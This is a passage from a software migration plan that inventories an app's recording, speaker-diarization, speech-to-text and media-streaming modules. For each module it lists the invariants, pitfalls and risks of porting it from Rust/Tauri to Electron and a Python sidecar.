- Save::Checkpoint appends only the dirty tail (rec_chunks) in ONE transaction (append is not idempotent — a partial success re-appended the tail and the recording physically repeated); Save::Full assembles the WAV and drops checkpoints in ONE transaction; Save::Transcript exists because re-running Full after pause re-encrypted hundreds of MB under the room mutex
- Nothing may edit a LIVE recording's meta except EngineMsg::EditMeta on the engine thread — Engine::flush overwrites the row with the engine's own copy, so direct writes were silently erased (the rec_set_speaker_name bug)
- Echo suppression: same words (ECHO_SAME_TEXT 0.6 of the shorter phrase's vocab) + time overlap (0.5) across lanes = one utterance; the SYS lane always wins; a garbled mic phrase (mean_p<0.35) overlapping sys speech is dropped as degraded echo; a dropped echo retracts its language vote (LaneLang::retract)
- Sticky language (LaneLang): first confident evidenced final locks the lane; 2 consecutive strong dissenting finals re-lock; 3 consecutive dead finals unlock a wrong lock (decodes forced to the wrong language die in the gates and can never dissent — the deadlock escape); partials never pay for the language detector
- Adaptive relabel cadence: re-cluster every 2 phrases but back off proportionally when a pass exceeds RELABEL_TIME_BUDGET_MS=40 (cap 64), because the engine thread also mixes audio and drives the level meter
- 3-hour hard ceiling (in-memory timeline ~230 MB/h) stops the session synchronously in ingest, not via a queued message (every queued batch would re-trip it)
- Stop drain: audio checkpointed durable the moment Stop is pressed, transcript tail drains, split_by_voice pass runs, verdict stored in RecShared.outcome so a Stop whose reply channel was taken (room lock/quit sends its own Stop) still gets the truth
- resample_to_16k treats rate==0 as identity — a zero from IPC used to panic the engine thread invisibly (channel died, UI kept showing REC)
- A decode failure is reported ONCE and is never silence — a broken model must not produce a recording where nobody spoke
- Retranscribe writes nothing until it finishes (stoppable via cancel registry); typed speaker names survive, guesses are rebuilt, read_of is deliberately dropped as stale; carried-over cuts re-mark freshly-derived words
- Live translation: newest-wins ring of 8 (a bounded channel dropped the WRONG end — the newest sentence), one worker, one lazily-resolved model
- rec-segment events strip the voiceprint (3.8 KB JSON per phrase the frontend never reads); RecMeta serde uses BTreeMap/BTreeSet for stable JSON key order because file-version history diffs the meta

**Gotchas:**
- Persistence crosses the new process split: the engine (Python) must persist into the Electron-owned DB with the exact one-transaction invariants; a naive HTTP-per-checkpoint design reintroduces the duplicated-chunk crash bug
- The 100 ms tick loop + mixing + relabel must not fight the GIL with the whisper decode thread — pywhispercpp releases the GIL during full(), but the numpy relabel pass and mixing need profiling; consider a subprocess or keep relabel adaptive as here
- mpsc EngineMsg semantics (drop-on-disconnect, undelivered SysTap gets its tap stopped) need explicit re-modeling in Python — several bug-fix comments depend on exact channel behavior
- Events (rec-level 5/s, rec-partial, rec-segment, rec-relabel, rec-state, rec-source, rec-error, rec-save-progress) must be bridged sidecar→Electron→renderer with ordering preserved
- whisper.cpp's WhisperVadContext (Silero ggml) is used here; pywhispercpp may not expose it — use silero-vad ONNX directly via onnxruntime and keep the VAD_TAIL warmup-context trick (the LSTM resets per call)
- RecMeta JSON must round-trip byte-stably: serde skip_serializing_if + camelCase + sorted map keys; Python json.dumps needs sort_keys and matching field omission or version-history diffs balloon
- The QA hook ARCELLE_QA_SYS_WAV (real-time WAV feeder into the sys lane) is the only way to e2e the loop without Screen Recording permission — keep it

**Native/Tauri surface:** tauri::AppHandle/Emitter/Manager (events, state, resource paths); tauri::async_runtime (live translator task); std::sync::mpsc engine/decoder channels; whisper_rs::WhisperVadContext (Silero VAD); ScreenCaptureKit via recording::sck (macOS cfg-gated)

### `src-tauri/src/recording/diarize.rs` — 3050 LOC → python-sidecar (8 d)

On-line speaker separation and cross-recording voice recognition: TitaNet-small 192-d embeddings (tract), 2 s sub-window prints averaged and renormalized, session-mean centering, agglomerative clustering with fixed calibrated gates, minimum cluster mass, Viterbi turn-continuity, live SpeakerBook assignment, label→name overlay movement (move_names/apply_names), recognized-name bookkeeping, stop-time split_by_voice pass, and KnownVoice enrollment/recognition (KNOWN_SAME=0.72 raw cosine with veto margin). DSP log-mel+pitch fallback print when the model is missing.

**Replacement:** Port the clustering/labeling/naming logic to Python+numpy verbatim (it is pure math over 192-float vectors) and run the SAME TitaNet-small ONNX with onnxruntime (the reference tract was validated against, cosine 1.000000). Feature extraction via a Python port of fbank.rs or kaldi-native-fbank's Python wheel, re-validated bit-close.

**Must preserve:**
- Two print generations (DSP 19/21-dim vs neural 192-dim) share no geometry: cosine refuses to mix them, lane_voices clusters only the newest generation present, legacy rows keep their labels — old rooms hold both
- Session centering (shrunken mean subtraction) is what made real Zoom audio work in both failure directions; saved voices are compared RAW (no shared channel across recordings) against the deliberately higher KNOWN_SAME bar
- A lane is a wall: mic and sys are clustered separately post-echo-removal so similar voices on opposite sides never merge; mic lane is 'You' only structurally
- Creation is the costliest online mistake: a live phrase needs ~2.5 s voiced (MIN_OPEN_FRAMES) and clear distance from every known voice to open a new speaker; short phrases attach but never reshape a centroid (frozen after 20 phrases)
- Names are keyed to labels as an OVERLAY and moved with the voice on every relabel (move_names builds the new map from scratch, handles swaps, drops orphaned names); 'recognized' holds NAMES not labels — guesses are re-decided every pass, typed names never
- SpeakerBook::seed_labels numbers new voices after a resumed file's existing speakers (their centroids were not persisted)
- voiced_frames unit (16 ms hop) is shared by BOTH print generations — the evidence gates must not move when the embedding does
- identity_print refuses DSP prints and thin evidence (MIN_IDENTITY_FRAMES) — the one place the 'too little speech to save a voice' rule lives

**Gotchas:**
- Every constant (gates, KNOWN_SAME, MIN_* frames, COUNT_FLOOR, SPLIT_WIN_CS) is calibrated to THIS embedding space and front end — swap either half and the thresholds are silently wrong; rerun tests/diar_bench.rs acceptance (DER ceiling 30, speaker-count exact) and the voice_id threshold sweep before shipping
- The 0.72 threshold was never measured on real cross-recording audio (memory note) — the harness exists, unrun
- tract executed TitaNet correctly but silently mis-executed CAM++ (cosine 0.18) — model and runtime were validated as a pair; onnxruntime is the original reference so the move is safe for THIS model only
- ~1900 lines of unit tests live in this file's tests module — they encode the clustering contracts and must be ported as pytest

**Native/Tauri surface:** tract-onnx (via titanet.rs); no tauri APIs (pure lib + OnceLock model path)

### `src-tauri/src/commands/recording_cmds.rs` — 2330 LOC → electron-main (6 d)

The 24-command surface over the engine: session lifecycle (rec_start with resume+chunk-rescue, rec_stop with verdict fallback, pause/resume, live toggles, rec_push_audio), caffeinate keep-awake tied to the app pid, retranscribe/translate long jobs on the shared cancel registry, the edit_rec_meta single-write-path with its claim protocol (live edits on the engine thread, offline edits in the room), speaker naming + voice enrollment (learn_voice, reject on correction), notes/chapters/highlights CRUD, delete/correct range, export-clean (splice + reflow_after_cuts), whole-transcript LLM translation, voices list/forget.

**Replacement:** ipcMain.handle surface in Electron main mirroring each command; session registry and cancel flags in main; long jobs (retranscribe, translate) dispatched to the sidecar with progress events; caffeinate replaced by powerSaveBlocker.start('prevent-app-suspension'); pure meta-editing logic (reflow_after_cuts, correct_words, merge_typed_since, at_time) ported to TS with its tests.

**Must preserve:**
- One live session at a time; clear_finished retires 'saved'/'failed' sessions lazily on every reader (the engine can finish without a command — 3 h ceiling, room closed)
- rec_start on resume MUST recover_rec_chunks BEFORE reading the WAV — the first flush drops chunk rows, so skipping the rescue records over a crashed session's tail
- The edit claim protocol: a timed-out live edit is either provably cancelled (retry OK) or provably landed (retry = duplicate) — never ambiguous; live edits see the shared duration_cs head because the engine's own meta is minutes stale between flushes
- rec_stop keeps the session entry for the whole drain (a reloaded window must see 'saving', not no-session) and has deliberately NO wall-clock deadline; verdict fallback via RecShared.outcome when another Stop stole the reply channel
- rec_delete_range / rec_correct_range refuse while live or retranscribing; corrections are confined to ONE phrase (no honest speaker for cross-phrase words) and empty correction is refused (delete is a different button)
- reflow_after_cuts: annotations inside cuts are dropped from the COPY only (cuts are undoable on the original); timestamps shift by cut_shift_before; voiceprints carried so the copy stays resumable
- set_speaker_name teaches the room: enroll under the new name, reject_voice under the corrected-away guess; names capped at 60 chars; naming back to the machine label is a removal
- merge_typed_since: after a rebuild only names typed DURING it come back, and only onto labels the rebuild left unnamed (GH #5 — one person on two speakers otherwise)
- rec_translate batches 12 lines, keeps untranslated lines in the original language and says so, writes the document only at the end, records derived_from lineage
- Commands have plain-AppState inner bodies because State<'_,_> is untestable outside a running app — keep that seam in TS

**Gotchas:**
- caffeinate -w <pid> existed because Drop never runs on quit — powerSaveBlocker is process-tied and fixes this class, but verify it survives the whole session
- store_file_bytes snapshots a file version on explicit edits; auto-flushes don't — the version-history semantics live partly in db.rs (another subsystem)
- rec_stop chains into start_rec_read (AI reading pass) best-effort AFTER the save — never let a read failure fail a stop

**Native/Tauri surface:** tauri::State/AppHandle/Window/Emitter; tauri::async_runtime::spawn_blocking; /usr/bin/caffeinate subprocess; base64 mic PCM over IPC 4x/s

### `src-tauri/src/commands/stt_cmds.rs` — 1095 LOC → electron-main (4 d)

Whisper model lifecycle (status/download/cancel/delete with ggml-magic + size-bounds validation, .part streaming, mmap-freeing watcher), one-shot transcribe_audio, the import-time run_stt_job (transcript as extracted text with provenance prefix, epoch-pinned write), spawn_summary_filler (background ai_summary filler), streaming dictation (dict_start/push/stop/cancel + dict_worker with adaptive partial cadence and audio-proportional stop timeout), and LLM dictation shaping (translate pass + mode rewrite, think-span stripping).

**Replacement:** Model download/validate/delete in Electron main (Node fetch streaming to .part, same magic/size checks, rename-into-place); dictation worker and transcription move to the sidecar (pywhispercpp) with dict-partial events over the event bridge; shaping stays a sidecar /generate call (it already routes through the sidecar). stt_effective_model resolution (downloaded-wins-over-bundled) reimplemented against Electron's userData/resources paths.

**Must preserve:**
- Download validation: refuse before rename unless >=100 MB, <=4 GB, and the first 4 bytes are ggml's magic 'lmgg' — HuggingFace resolve/main is a MUTABLE pointer so no digest can be pinned; an error page with a 200 must never become 'installed: true'
- Delete must actually free the space: unlinking an mmapped file frees nothing, so drop the warm context first; a decode in flight → background watcher retries for ~10 min; also sweep the orphaned .part
- Dictation partial step grows with the last decode's cost (each repaint re-decodes from the start — a fixed step melted the Mac on long dictations); the drain loop skips to newest audio; DICT_MAX_SECS=600 is a leak guard
- dict_stop timeout is BASE 120 s + 2 s per second of audio — a flat ceiling threw away five-minute dictations mid-decode; the frontend awaits its last push before Stop so the final word is never clipped
- Shaping ALWAYS runs on a genuinely local model (explicitly swaps :cloud proxies too — dictated words never leave the Mac) and strips <think> spans (the model's reasoning must not be typed as the user's words); translate is its own pass before shaping; any LLM failure keeps the raw transcript
- run_stt_job distinguishes 'failed' (undecodable container) from 'none' (silent recording) and pins its write to room path + epoch
- Dictation is deliberately NOT the recording engine: no Recording file, no diarization, no room lock

**Gotchas:**
- STT_DOWNLOADING/CANCEL are process-global atomics; in Electron main that's module state — fine, but the cancel-flag reset ordering (cleared at start and end) prevents a stale Stop killing the next download
- The source-scanning test (the_download_actually_refuses_what_is_not_a_model) pins check-before-rename in the Rust source text — port the invariant as a real test, not a source grep

**Native/Tauri surface:** tauri path resolver (app_data_dir, Resource); reqwest streaming download; tauri events (stt-download-progress, stt-progress, dict-partial); tauri::async_runtime::spawn_blocking

### `src-tauri/src/stt.rs` — 942 LOC → python-sidecar (5 d)

Whisper engine wrapper (whisper-rs, Metal): media_kind sniffing, decode_to_pcm via macOS afconvert/avconvert (no ffmpeg) with owner-only temp files, one warm mmapped WhisperContext keyed by model path (lock covers lookup only — parallel decodes are the point), unload_ctx (ggml Metal asserts at exit) and unload_model (mmap actually freed), whole-file transcribe with junk/stock-hallucination gates, and transcribe_segments for live phrases: LangMode Auto/Sniff/Forced/Watch, beam-5 finals vs greedy partials, byte-level BPE word merging (Hebrew), the reference silence rule (no_speech>0.6 AND avg_logprob<-1.0), lang_detect confidence reporting.

**Replacement:** pywhispercpp (whisper.cpp, Metal) in the sidecar with a thin module reproducing: warm-context cache with lookup-only locking, the four LangModes (language detect via whisper_lang_auto_detect on the decoded state), token-byte word merging, and the exact hallucination/junk/silence gates. Keep afconvert/avconvert subprocess decoding (Python subprocess) with 0o600 temp files.

**Must preserve:**
- The CTX lock must end before full() — holding it serialized every speech job in the app (a 45-min import froze live transcription)
- unload_model returns false while a decode holds the Arc (deleting the model must not report freed space it didn't free); unload at exit or ggml Metal aborts the process during teardown
- Words are merged from RAW TOKEN BYTES, never per-token strings — BPE splits multi-byte UTF-8 (Hebrew/CJK) across tokens and per-token decode yields U+FFFD; a piece starting with b' ' opens a word
- Stock hallucinations ('Thank you.', Amara credits, in 14 languages) are dropped ONLY with mean_p < 0.5; low confidence alone never deletes (the old 0.30/0.18 floors punched holes in real accented speech — deliberately removed)
- *-turbo Whisper silently cannot translate — never offer the translate task; translation is the LLM's job
- Sniff reports lang_detect's real probability (reporting 1.0 once let a confidently-wrong first phrase lock a lane); Forced/Auto never run the detector
- no_context=true per phrase (context carry-over makes Whisper repeat the previous phrase over silence); suppress_nst on; beam 5 finals / greedy best_of 5 partials
- Temp files owner-only from creation (create_new + 0o600), converter outputs tightened, removed on every path — they hold the room's decrypted audio
- format_stamp is THE one [m:ss] implementation — player, search, and AI parse this exact shape

**Gotchas:**
- Verify pywhispercpp exposes token-level data (bytes, p, plog, t0/t1), no_speech_probability, lang_detect-on-state, suppress_nst and beam params — anything missing means dropping to whisper.cpp's C API via ctypes for those calls
- Model file is user-downloaded OR bundled (ggml-large-v3-turbo-q5_0, 574 MB); mmap semantics (address space not RSS) informed the keep-warm decision — same holds in Python

**Native/Tauri surface:** whisper-rs / whisper.cpp (Metal); /usr/bin/afconvert, /usr/bin/avconvert subprocesses

### `src-tauri/src/media_probe.rs` — 534 LOC → python-sidecar (3 d)

AVFoundation media probing: duration/display-size(transform-applied)/codec-fourcc-naming/frame-rate/bitrate/has-audio, all fields honestly optional (a no-tracks asset probes to None, never zeros); probe_bytes stages decrypted bytes as owner-only temp files (extension preserved — AVFoundation dispatches on it) removed on every path; last_frame_png grabs the video track's REAL final frame (video-track end minus 1/30 s, zero tolerance, keyframe-tolerant retry) for Story-mode clip continuity.

**Replacement:** PyObjC in the sidecar: AVURLAsset/AVAssetTrack for probing and AVAssetImageGenerator for the last frame (synchronous accessors are fine on a worker thread — this is plain property access, not the SCK streaming-callback trap). Same owner-only tempfile discipline (os.open with 0o600).

**Must preserve:**
- Display size = naturalSize through preferredTransform's bounding box (portrait iPhone clips store landscape + 90°)
- Unknown stays unknown: 0/NaN frame rates rejected, unmapped fourccs shown verbatim, an all-default MediaMeta is dropped rather than stored
- Duration is an ASSET property (tracks disagree by AAC priming); last-frame anchors to the VIDEO track's end, not asset duration (audio overhang made zero-tolerance grabs fail 'Cannot Open'), zero tolerance first then before-tolerant retry
- Partial temp writes are removed too (disk-full mid-write used to leak decrypted video)

**Gotchas:**
- Keep the extension on temp copies or containers mis-sniff
- The test fixture builds a clip from the Sonoma wallpaper via avconvert and SKIPS when absent — port that skip-not-fail behavior

**Native/Tauri surface:** objc2-av-foundation (AVURLAsset, AVAssetTrack, AVAssetImageGenerator); objc2-core-media (CMTime, CMFormatDescription); objc2-app-kit (NSBitmapImageRep PNG encode)

### `src-tauri/src/commands/media_limits.rs` — 453 LOC → electron-main (1.5 d)

OpenRouter media-GENERATION limits (not audio — grouped here by name): fetches /videos/models and /images/models, parses per-model durations/resolutions/aspect ratios/frame slots/reference caps, merges the two catalogs without overwriting (an images-endpoint overwrite blanked durations and turned 'unpublished' into 'refuses first frames'), tracks per-endpoint loaded flags (half a table settles nothing), hour/5-min staleness, single-flight fetch with wait-only-when-empty.

**Replacement:** A TS module in Electron main (or shared with the Create-page subsystem): fetch + zod-ish parsing + the same merge/staleness/loaded-flag semantics; plain Map cache.

**Must preserve:**
- Empty published list means 'send nothing, let the model default' — never a refusal; a 200 that names no models is NOT a loaded catalog (drop_unserved would empty the Create page and blame the provider)
- Image parse runs second and only FILLS gaps (frame slots and durations belong to the video endpoint)
- media_table_loaded requires BOTH endpoints — a lone video table made every image model look unserved
- Half tables retry after 5 min, full after 60; concurrent callers wait only when they have nothing to serve

**Gotchas:**
- This file belongs with the Create-page/model-routing subsystem in the final plan — flag the grouping so it isn't inventoried twice or zero times

**Native/Tauri surface:** reqwest to OpenRouter (bearer key, HTTP-Referer/X-OpenRouter-Title headers)

### `src-tauri/tests/rec_bench.rs` — 453 LOC → python-sidecar (1.5 d)

Manual real-audio benchmark (not pass/fail): full retranscribe over a real meeting WAV printing realtime factor, per-speaker talk time, transcript dump, DER vs RTTM, and word recall/precision vs a word<TAB>seconds reference; plus calibrate_embeddings printing same/different-speaker cosine percentiles (raw and session-centered) from ground-truth solo spans — the calibration synthetic say fixtures could never give.

**Replacement:** Port as a manual pytest/script beside the diar_bench port, sharing the DER scorer; the embedding-percentile calibration is the tool for re-validating the onnxruntime front-end swap.

**Must preserve:**
- Exists because say-fixture tests kept passing while real far-field audio regressed — never tune STT/diarization on synthetic fixtures alone (standing memory rule)
- Calibration filters to neural prints only (DSP fallback would poison the stats) and mirrors cluster()'s shrunken-mean centering exactly

**Gotchas:**
- calibrate_embeddings points the diarizer at the repo's bundled model explicitly (no resource resolution in integration tests) — the Python port needs the same explicit-path seam

### `src-tauri/tests/diar_bench.rs` — 369 LOC → python-sidecar (2 d)

Pass/fail diarization acceptance benchmark: runs the shipping retranscribe over a TSV manifest of real recordings with RTTM truth, computes sampled DER (10 ms, ±0.25 s collar, best injective speaker mapping), fails rows over PR_BENCH_MAX_DER (default 30) or with a wrong speaker count; plus voice_id_threshold_sweep measuring false-accept/false-reject of KNOWN_SAME across bars on cross-recording pairs (ground-truth turns so clustering errors can't hide in the identity number).

**Replacement:** pytest -m acceptance port: the DER scorer is ~150 lines of numpy; drives the Python retranscribe. Consider pyannote.metrics for DER to cross-check the hand scorer. This is the regression gate for the whole diarization port — run it against ~/diarization-lab manifests before and after.

**Must preserve:**
- Results file is REWRITTEN never appended ('the numbers' must not be whatever you last looked at)
- False accept is the error that matters (a real person's name on somebody else's words, nothing downstream catches it) — ceiling defaults to 0%
- Identity = sid prefix before '-' (dana-monday / dana-thursday); same-take pairs excluded (measure nothing)

**Gotchas:**
- Ground-truth data lives outside the repo (~/diarization-lab); env-var driven, --ignored — keep it runnable, it is the only thing that has ever caught real-audio regressions past green unit suites

### `src-tauri/src/commands/media.rs` — 311 LOC → electron-main (2 d)

The roommedia:// streaming layer: decrypted media staged in an in-process map under one-shot tokens (never on disk), byte-budgeted eviction (4 entries / 1.5 GB, newest always kept), and the pure media_response builder with full single-Range grammar (206/416/404), no-store, and Access-Control-Allow-Origin:* on every answer including failures (frame-grab canvas would otherwise taint).

**Replacement:** protocol.handle('roommedia', ...) in Electron main serving Response objects from the same staged map; Range parsing ported as-is (Electron/Chromium sends Range for media seeks; Electron does not implement 206 for you). Clear on room close.

**Must preserve:**
- Bytes live only in memory — a locked room leaves no decrypted media behind
- Byte budget, not just entry count (four large videos are four large videos); the newest entry survives however big
- CORS header on 404/416 too — eviction mid-playback must surface as its own error, not an opaque CORS failure
- Suffix ranges (bytes=-N), clamped ends, inverted/garbage refused; only single ranges (media elements never send multipart)

**Gotchas:**
- Chromium's media stack in Electron behaves differently from WKWebView — retest whether full-file 200 responses allow seeking before assuming the Range path is load-bearing, but keep it (large files won't play without 206 in WKWebView; Chromium also wants Accept-Ranges)

**Native/Tauri surface:** Registered as a tauri custom URI scheme handler in lib.rs (this file is the pure logic)

### `src-tauri/src/commands/peaks.rs` — 289 LOC → python-sidecar (1.5 d)

audio_peaks command: decode any container to PCM (same path as STT), reduce to <=8000 max-abs buckets, normalize to the loudest moment unless under NOISE_FLOOR (silence must not amplify into a fake waveform), report true duration from sample count (fixes Infinity-duration streamed containers) and a 'silent' verdict; cache keyed by (id, buckets, stored byte size) so a continued recording can't serve its stale envelope.

**Replacement:** Sidecar endpoint doing decode (afconvert path shared with STT) + numpy max-abs bucketing; the per-room cache and its (id,buckets,size_bytes) key live in Electron main next to the DB reads. Do NOT let the renderer decode (wavesurfer's default path is ~1 GB of Float32 for a 2 h meeting).

**Must preserve:**
- Max-abs per bucket, never mean (mean speech envelopes are flat); normalize only above NOISE_FLOOR=0.01; 'silent' decided server-side so the lane and its label can't disagree
- Cache key includes stored byte length — 'Continue recording' grew the file and every mark against the cached duration pointed at the wrong moment
- Room lock is dropped before decoding (converters take real seconds); avconvert's ambiguous failure is rendered as 'no audio track this Mac can read', other errors verbatim

**Gotchas:**
- Cache must clear with the room (decrypted derivative)

**Native/Tauri surface:** tauri Manager/state; spawn_blocking; afconvert via stt::decode_bytes_to_pcm

### `src-tauri/src/recording/sck.rs` — 266 LOC → electron-builtin (3 d)

macOS system-audio tap on ScreenCaptureKit: audio-only SCStream (video shrunk to 2x2, never subscribed), excludesCurrentProcessAudio so playback never records itself, 16 kHz mono requested but the per-buffer ASBD sample rate is trusted (config read-back lies), non-interleaved stereo averaged to mono, 20 s permission/start timeouts, PERMISSION_HINT text explaining the ad-hoc-signing TCC reset.

**Replacement:** Electron >= 39 loopback audio: session.setDisplayMediaRequestHandler with audio:'loopback' (or 'loopbackWithMute'), renderer getDisplayMedia + AudioWorklet feeding the same PCM push path as the mic lane. Explicitly NOT PyObjC ScreenCaptureKit (callbacks never fire, pyobjc #647).

**Must preserve:**
- The delivered buffer's own format description is the only honest sample-rate source — resample whatever arrives instead of assuming 16 kHz was granted
- App's own audio output must be excluded (or muted via loopbackWithMute) so playing back an earlier recording never records itself
- Startup takes seconds (permission round-trip): the engine's resync/'Starting' state machine and the never-two-taps rule depend on that latency being modeled
- Denied permission degrades to mic-only with an explanatory message, never a failed recording; the hint must mention toggling the grant off-and-on (signature-pinned TCC grants die on ad-hoc rebuilds)

**Gotchas:**
- Electron loopback captures ALL system audio including the app itself — decide mute-vs-mix before the echo-suppression tuning, since echo_of/overlaps_sys_speech assume the sys lane cannot hear the room or the app
- A tap that finishes starting after Stop must still be torn down (the undelivered-message arm here) — translate to cancelling the getUserMedia track
- Screen Recording TCC prompt still applies to loopback capture; the first-run UX flow must survive

**Native/Tauri surface:** objc2 / objc2-screen-capture-kit (SCStream, SCContentFilter, SCStreamConfiguration); objc2-core-media (CMSampleBuffer, hand-declared CMAudioFormatDescriptionGetStreamBasicDescription); block2/dispatch2 (completion handlers, delivery queue); NSProcessInfo OS-version gate (macOS 13+)

### `src-tauri/src/commands/speech_cmds.rs` — 230 LOC → electron-main (1.5 d)

TTS commands: speak_text_neural / speak_one proxy one redacted sentence to the sidecar's /tts (Edge neural voices, WAV base64 back), gated on the room's internet switch with the switch-blind remote-seam redactor (the one un-modelled outbound seam — closed 2026-08-02); list_neural_voices proxies /tts/voices and caches 24 voice ids (multilingual first) in room settings for podcast cast seeding.

**Replacement:** Thin ipcMain handlers in Electron main calling the existing sidecar /tts and /tts/voices endpoints (already Python); the offline-switch check and the mechanical redaction call move with the privacy subsystem's TS/Python home.

**Must preserve:**
- Every spoken sentence passes the redactor BEFORE leaving (the /tts body carries no model, so generic policy injection missed it) and the user hears the placeholder — that is the truth about what left
- Offline switch refusal uses the voice-specific message the webview string-matches on ('Online features')
- MAX_SPEAK_CHARS=1000 mirrors the sidecar's cap; unset voice/rate/pitch knobs are omitted, not sent empty
- Preview (podcast) shares speak_one on purpose — one door for the seam where room text leaves the Mac

**Gotchas:**
- The redactor (remote_seam_redactor/PrivacyReport) lives in the privacy subsystem — coordinate ownership so this seam doesn't get its own weaker door in the rewrite

**Native/Tauri surface:** tauri::State; sidecar_json HTTP proxy

### `src-tauri/src/recording/diarize/fbank.rs` — 154 LOC → python-sidecar (1 d)

The exact NeMo/librosa-style log-mel front end TitaNet was trained with: 25 ms/10 ms snip_edges frames, no dither, no DC removal, preemphasis 0.97 descending, periodic Hann (denominator 400), 512-pt power spectrum, 80 Slaney mel triangles 0–8 kHz with area normalization, Nyquist bin included. Validated bit-close (<1e-4) against the onnxruntime reference; every constant is contract.

**Replacement:** Use librosa/NeMo's own featurizer or the kaldi-native-fbank Python wheel configured identically; re-run the parity check (max feature diff <1e-4, embedding cosine 1.000000) before accepting.

**Must preserve:**
- Any drift here silently miscalibrates every diarization threshold — the file's own header forbids changes without re-running parity

**Gotchas:**
- Nyquist-bin inclusion and Slaney area norm are the two spots naive kaldi-style configs differ

### `src-tauri/src/recording/diarize/titanet.rs` — 93 LOC → python-sidecar (1 d)

TitaNet-small inference via tract-onnx: cached optimized plan per model path (failed loads cached too), symbolic time axis, per-feature normalization over time, frame count padded to a multiple of 16 with the UNPADDED length input for masking, L2-normalized 192-d embedding from output index 1. Infallible-by-None: a missing/broken model falls back to the DSP print.

**Replacement:** onnxruntime InferenceSession (load once, share across threads), same preprocessing: per-feature mean/sd normalize, pad-to-16 with true length input, take output[1], L2-normalize. onnxruntime is the reference this graph was validated against.

**Must preserve:**
- A failed model load is cached — retrying per phrase would burn the decode thread
- Never break a recording: every failure path returns None and the DSP fallback carries on

**Gotchas:**
- Output ordering ([logits, emb]) and the pad-to-16/length-mask contract are model-specific — verify on the shipped nemo_en_titanet_small.onnx, not from docs

**Native/Tauri surface:** tract-onnx

**Subsystem risks:**
- The engine's DB persistence crosses the new process boundary: today the Rust engine writes checkpoints/WAV/meta directly into the room SQLite under precise one-transaction invariants (append_rec_chunk is NOT idempotent; finalize must drop chunks atomically with the WAV write). In the rewrite the Python engine must persist through Electron main (which owns the DB) — a lossy or retried IPC hop reintroduces the exact crash bugs those transactions fixed (repeated audio stretches, half-second lane dropouts at checkpoint boundaries). Design the checkpoint RPC contract first, with the rescue-on-resume path (recover_rec_chunks before reading the WAV).
- Diarization calibration is a house of cards: every threshold (gates, KNOWN_SAME=0.72, MIN_*_FRAMES, split-window sizes) is calibrated to the TitaNet-small ONNX + the exact fbank front end. onnxruntime is the validated reference for the model, but the Python front end must re-pass the bit-close parity check and the diar_bench acceptance run (DER ceiling + exact speaker counts on the AMI/meeting sets) or diarization silently degrades in ways unit tests cannot see. Stored VoicePrints in existing .room files must keep working (two print generations already coexist — the rewrite must not mint a third).
- System-audio capture changes technology (SCK → Electron getDisplayMedia loopback): self-audio exclusion (excludesCurrentProcessAudio has no direct loopback equivalent — 'loopbackWithMute' mutes local playback instead), TCC permission flow, startup latency and per-buffer sample-rate honesty all differ. The engine's lane-resync, echo-suppression (sys lane 'cannot hear the room') and mic-death-watchdog logic bake in SCK's timing; each assumption needs re-verification. The known trap stands: do NOT try PyObjC ScreenCaptureKit (callbacks never fire).
- Real-time audio through more hops: mic PCM currently flows WebView→tauri IPC (base64, 4x/s)→engine thread. Renderer→Electron→sidecar doubles serialization; route PCM directly renderer→sidecar (WebSocket/UDS) or the level meter, partials and VAD cadence lag. Python GIL contention between the tick/mix loop, relabel passes and whisper decode needs an explicit thread/process design (pywhispercpp releases the GIL in full(), numpy relabel mostly does, but the 40 ms relabel budget logic exists because this already ran hot in Rust).
- pywhispercpp API coverage is unverified for the deep whisper.cpp features this pipeline needs: token byte access (BPE word merge for Hebrew), token p/plog, no_speech_probability, lang_detect on a decoded state (the Sniff/Watch confidence report), suppress_nst, beam params, and the Silero VAD context. Any gap means ctypes into whisper.cpp's C API — budget for it. Also the Metal teardown assert (unload context before exit) applies to the sidecar's shutdown path.
- RecMeta JSON compatibility: existing rooms hold serde-generated camelCase JSON with skip-if-empty fields and BTreeMap-ordered keys (file-version history diffs it). The TS/Python reimplementation must parse all legacy shapes (missing fields default, retired fields ignored, DSP-generation voiceprints, segments with no words) and write stably-ordered JSON, or version history balloons and 'transcript data can't be read' errors appear on old files.
- Event storm fidelity: the UI is driven by ~13 event channels (rec-level 5/s, rec-partial, rec-segment, rec-segment-drop, rec-relabel, rec-state, rec-source, rec-save-progress, rec-error, rec-retranscribe, rec-translate-progress, dict-partial, stt-download-progress/stt-progress). The sidecar→Electron→renderer bridge must preserve ordering per fileId (a partial arriving after its final re-paints a ghost line — a bug this code fixed twice).
- Cross-subsystem seams to coordinate: speak_text_neural depends on the privacy redactor (another subsystem's TS/Python home); rec_stop chains into start_rec_read (AI jobs subsystem); rec_translate/shape_text call the model-routing layer; media_limits.rs actually belongs to the Create-page subsystem — make sure the fleet's coverage ledger assigns it exactly once.
- Testing burden is the real schedule risk: this subsystem carries ~2500 lines of behavior-encoding unit tests (recording.rs, diarize.rs, stt.rs tests modules) plus two env-driven real-audio benches. Most encode fixed bugs (echo retraction, wrong-lock escape, checkpoint marks, edit claims). Port the tests with the code — the memory's standing lesson is that agent-ported 'fixes' ship inert without them.

## 4. Browser, web & downloads

Browser-web-downloads subsystem (~10.9k LOC Rust + 1.5k LOC injected JS): Arcelle's private in-app browser (BROWSE-1..3c), the six browse_* agent tools, the SSRF-guarded first-party fetch/search stack, media downloads via a self-updating yt-dlp binary, and webview screenshotting. Architecture today: each browser tab is a child WKWebView (wry `incognito(true)` = non-persistent data store) driven ONLY via an injected page script + `evaluateJavaScript` (Tauri IPC can't reach remote origins); WebKit compiles a content-rule list for tracker + private-network sub-resource blocking; every outbound fetch goes through one literal URL guard + DNS resolve + connection pinning with hand-rolled redirect following; everything the agent does is journaled into the room DB while the web itself persists nothing. Rewrite shape: almost the whole subsystem lands in Electron main (TS). Electron makes three whole layers of workaround machinery deletable: (1) `executeJavaScript` awaits promises and reports exceptions, so the ticket/poll bridge, EVAL_LOST/EVAL_TIMED_OUT classification and much of wait_ready shrink dramatically; (2) `session.on('will-download')` exposes real progress + cancel + save path, deleting the stat-polling oversize watcher and the URL-keyed staging map; (3) `did-start-navigation` carries `isMainFrame` and `setWindowOpenHandler` intercepts popups, deleting the sub-frame-record-corruption defenses and NO_POPUPS_JS. What must NOT be lost: the privacy invariants (in-memory session verified against the live session, not asserted; private-range blocking for sub-resources INCLUDING WebSockets; DNS-pinned fetches with per-hop redirect re-checks), the outbound consent door, the journal contract, and the truthful-failure wording the agent tools depend on (dozens of live-QA bugs are encoded as exact behaviors). No Python needed here except keeping /web_search in the existing sidecar; yt-dlp stays an independently self-updating standalone binary spawned from Electron main.

